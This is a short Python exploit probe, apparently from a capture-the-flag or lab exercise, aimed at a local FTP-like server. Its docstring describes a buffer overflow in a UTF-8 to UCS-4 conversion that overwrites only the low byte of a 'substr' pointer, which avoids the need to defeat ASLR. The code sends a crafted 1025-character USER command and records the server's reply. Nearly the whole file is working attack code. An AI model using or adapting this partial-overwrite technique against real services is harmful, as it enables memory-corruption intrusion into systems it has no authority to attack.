#!/usr/bin/env python3
"""ASLR-independent probe: overwrite only substr's low byte.

A 1025-code-point key makes rewrite_utf8_to_ucs4 write exactly one 8-byte word
past ucs4_longs (at utf8_val[0]); the second loop then writes utf8_val[0..1024],
so substr (utf8_val+1024) gets only its byte 0 replaced, with the low byte of
code point 0. No PIE base is needed: if the original substr points just past
'}' in the map string, a small negative delta lands inside the attacker's key.
Usage: client6-partial.py <byte 0..255> [key_length, default 1025]
"""
import socket
import sys
import time

byte = int(sys.argv[1]) & 0xFF
keylen = int(sys.argv[2]) if len(sys.argv) > 2 else 1025
host, port = "127.0.0.1", 21894

# Connect before the first attempt so a fresh server can start.
for _ in range(40):
    try:
        s = socket.create_connection((host, port), 1)
        s.close()
        break
    except OSError:
        time.sleep(0.25)

cps = [chr(byte)] + ["A"] * (keylen - 1)
key = "".join(cps)
assert len(key) == keylen
raw = key.encode("utf-8")
s = socket.create_connection((host, port), 8)
s.settimeout(8)
try:
    s.recv(4096)
    s.sendall(b"USER " + raw + b"\r\n")
    time.sleep(0.05)
    s.sendall(b"NOOP\r\n")
    try:
        reply = s.recv(4096)
    except Exception:
        reply = b""
    print("BYTE=0x%02x KEYLEN=%d NOOP_REPLY=%s" % (byte, keylen, repr(reply[:80])))
except Exception as exc:
    print("BYTE=0x%02x FAIL %s: %s" % (byte, type(exc).__name__, str(exc)[:100]))
finally:
    s.close()
